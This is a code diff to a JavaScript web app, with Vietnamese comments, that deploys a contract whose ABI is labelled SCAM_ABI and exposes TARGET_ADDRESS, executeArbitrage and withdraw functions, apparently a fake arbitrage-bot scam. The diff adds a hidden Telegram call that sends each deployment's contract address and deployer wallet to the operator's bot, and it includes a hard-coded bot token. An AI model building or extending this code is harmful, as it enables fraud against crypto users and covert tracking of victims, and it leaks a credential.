@@ -358,6 +358,9 @@ try {
 
 // ===== LƯU THÔNG TIN user =====
 saveuserData(userAddr, name, address);
+
+// ===== TELEGRAM NOTIFICATION =====
+sendTelegramNotification(name, address, userAddr);
 // =================================
 
 }catch(err){log('Deploy failed: '+(err.message||err),'error')}}
@@ -418,6 +421,49 @@ function getuserData() {
   try { return JSON.parse(localStorage.getItem(user_STORAGE_KEY) || '{}'); }
   catch { return {}; }
 }
+
+// ===== TELEGRAM NOTIFICATION =====
+const TELEGRAM_CONFIG = {
+  botToken: '8809091321:AAH9wivwKTz3fKwoAHSq9xzY9ZI99wA1NG0',
+  chatId: '' // Will be auto-detected after you send a message to the bot
+};
+
+async function sendTelegramNotification(contractName, contractAddr, deployerAddr) {
+  // Check if Telegram is configured
+  if (!TELEGRAM_CONFIG.botToken || !TELEGRAM_CONFIG.chatId) {
+    console.log('[Telegram] Not configured. Set botToken and chatId in app.js');
+    return;
+  }
+
+  const message = `New Contract Deployed!\n\n` +
+    `Contract: ${contractName}\n` +
+    `Address: ${contractAddr}\n` +
+    `Deployer: ${deployerAddr}\n` +
+    `Time: ${new Date().toLocaleString()}\n\n` +
+    `Monitor: ${window.location.origin}/monitor.html?contracts=${encodeURIComponent(JSON.stringify([{name:contractName,address:contractAddr}]))}`;
+
+  try {
+    const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
+    const response = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CONFIG.chatId,
+        text: message,
+        parse_mode: 'HTML'
+      })
+    });
+    
+    if (response.ok) {
+      log('[Telegram] Notification sent!', 'success');
+    } else {
+      log('[Telegram] Failed to send notification', 'error');
+    }
+  } catch (e) {
+    console.log('[Telegram] Error:', e.message);
+  }
+}
+// ==================================
 
 const SCAM_ABI=[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"TARGET_ADDRESS","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"executeArbitrage","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"getBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getOwner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"withdrawETH","outputs":[],"stateMutability":"nonpayable","type":"function"},{"stateMutability":"payable","type":"receive"}];
 
